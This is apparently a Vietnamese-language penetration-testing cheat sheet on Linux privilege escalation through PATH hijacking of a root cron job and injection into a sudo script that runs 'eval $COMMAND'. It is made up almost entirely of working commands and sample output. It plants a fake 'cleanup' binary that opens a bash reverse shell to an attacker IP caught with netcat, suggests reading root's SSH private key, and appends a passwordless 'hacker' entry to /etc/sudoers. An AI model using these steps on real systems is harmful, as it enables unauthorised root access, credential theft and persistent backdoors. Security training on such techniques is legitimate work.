# Environment Variable Exploits

## Điểm chính khai thác

* Thao túng biến **PATH** để ưu tiên thực thi tệp nhị phân độc hại từ thư mục do người dùng kiểm soát (như `/tmp`) khi tiến trình đặc quyền gọi lệnh mà không dùng đường dẫn tuyệt đối
* Tiêm biến môi trường chứa lệnh độc hại để khai thác tập lệnh đặc quyền (chạy qua `sudo`) xử lý biến không an toàn (ví dụ: `eval $COMMAND`)
* Phát hiện tiến trình hoặc cron job gọi tệp nhị phân không có đường dẫn tuyệt đối bằng **pspy** hoặc kiểm tra `/etc/crontab`; xác minh tập lệnh đặc quyền bằng `sudo -l`
* Yêu cầu thư mục có thể ghi (tìm bằng `find / -writable -type d`) để lưu tệp nhị phân độc hại và quyền chạy tập lệnh đặc quyền qua `sudo`
* Hiệu quả trong môi trường Linux nơi cron job hoặc tập lệnh đặc quyền xử lý lệnh hoặc biến môi trường một cách không an toàn

## Các bước khai thác

### Kiểm tra lỗ hổng

#### Xác định mục tiêu tiềm năng

Tìm thư mục có thể ghi để lưu tệp nhị phân độc hại:

```
find / -writable -type d 2>/dev/null
```

Output mong đợi: Danh sách thư mục, ví dụ: `/tmp`

Kiểm tra cron job hoặc tiến trình root gọi tệp nhị phân không có đường dẫn tuyệt đối:

```
pspy
```

Output mong đợi: Tiến trình root, ví dụ: `UID=0 PID=1234 | cleanup`

Kiểm tra cấu hình cron job:

```
cat /etc/crontab
```

Output mong đợi: Lệnh cron, ví dụ: `* * * * * root cleanup`

Kiểm tra tập lệnh đặc quyền có thể chạy qua `sudo`:

```
sudo -l
```

Output mong đợi: Tập lệnh, ví dụ: `(root) NOPASSWD: /scripts/file.sh`

Kiểm tra tập lệnh đặc quyền để tìm xử lý biến môi trường không an toàn:

```
cat /scripts/file.sh
```

Output mong đợi: Lệnh nguy hiểm, ví dụ: `eval $COMMAND`

#### Kiểm tra quyền truy cập hoặc cấu hình

Kiểm tra quyền ghi trên thư mục mục tiêu (ví dụ: /tmp):

```
ls -ld /tmp
```

Output mong đợi: Quyền thư mục, ví dụ: `drwxrwxrwt 10 root root 4096`

#### Phân tích ngữ cảnh thực thi

Xác minh hành vi tiến trình root gọi tệp nhị phân:

```
pspy
```

Output mong đợi: Tiến trình gọi lệnh, ví dụ: `UID=0 PID=1234 | cleanup`

### Thực thi khai thác

#### Chuẩn bị payload hoặc mã khai thác

Tạo tệp nhị phân độc hại cho thao túng PATH:

```
echo '#!/bin/bash' > /tmp/cleanup
echo 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' >> /tmp/cleanup
```

Ghi chú: Thay `192.168.1.100` và `4444` bằng IP và cổng attacker. Tệp giả mạo lệnh `cleanup`.

Cấp quyền thực thi cho tệp nhị phân:

```
chmod +x /tmp/cleanup
```

Output mong đợi: Tệp có thể thực thi, ví dụ: `-rwxr-xr-x 1 user user`

Sửa đổi biến PATH để ưu tiên thư mục có thể ghi:

```
export PATH=/tmp:$PATH
```

Output mong đợi: PATH cập nhật, ví dụ: `/tmp:/usr/bin:/bin`

Thiết lập biến môi trường độc hại cho tập lệnh đặc quyền:

```
export COMMAND="/bin/bash"
```

Ghi chú: Điều chỉnh lệnh dựa trên mục tiêu, ví dụ: `/bin/bash` cho shell hoặc `cat /root/.ssh/id_rsa` để trích xuất dữ liệu.

#### Áp dụng khai thác

Chạy tập lệnh đặc quyền để kích hoạt biến môi trường độc hại:

```
sudo /scripts/file.sh
```

Ghi chú: Đảm bảo `/scripts/file.sh` được phép chạy qua `sudo -l`. Output mong đợi: Shell root.

Chờ cron job chạy tệp nhị phân độc hại:

```
sleep 60
```

Ghi chú: Điều chỉnh thời gian dựa trên lịch cron (kiểm tra `/etc/crontab` hoặc **pspy**).

Bắt shell ngược:

```
nc -lvnp 4444
```

Output mong đợi: Kết nối từ mục tiêu, ví dụ: `Connection from 192.168.1.101:45678`

#### Kích hoạt khai thác

Kiểm tra quyền root sau khai thác:

```
id
```

Output mong đợi: Quyền root, ví dụ: `uid=0(root) gid=0(root)`

### Kiểm tra kết quả

Xác nhận quyền root:

```
whoami
```

Output mong đợi: `root`\
Xác nhận: Thử lệnh yêu cầu quyền cao, ví dụ: `echo 'hacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers`.

## Ví dụ khai thác

### Thao túng PATH với Cron Job

**Kịch bản mẫu**: Cron job root chạy `cleanup` (không phải `/usr/bin/cleanup`) mỗi phút, thư mục `/tmp` có thể ghi. Tạo `/tmp/cleanup` để mở shell ngược.\
**Output**:

```
pspy
2025/05/16 14:00:01 CMD: UID=0 PID=1234 | cleanup

cat /etc/crontab
* * * * * root cleanup

ls -ld /tmp
drwxrwxrwt 10 root root 4096

echo '#!/bin/bash' > /tmp/cleanup
echo 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' >> /tmp/cleanup
chmod +x /tmp/cleanup
export PATH=/tmp:$PATH

nc -lvnp 4444
Connection from 192.168.1.101:45678
whoami
root
```

### Tiêm Biến Môi trường với Sudo Script

**Kịch bản mẫu**: Tập lệnh `/scripts/file.sh` chạy qua `sudo` chứa `eval $COMMAND`, cho phép bởi `sudo -l`. Tiêm lệnh để nhận shell root.\
**Output**:

```
sudo -l
(root) NOPASSWD: /scripts/file.sh

cat /scripts/file.sh
eval $COMMAND

ls -ld /tmp
drwxrwxrwt 10 root root 4096

export COMMAND="/bin/bash"
sudo /scripts/file.sh

id
uid=0(root) gid=0(root)
whoami
root
```
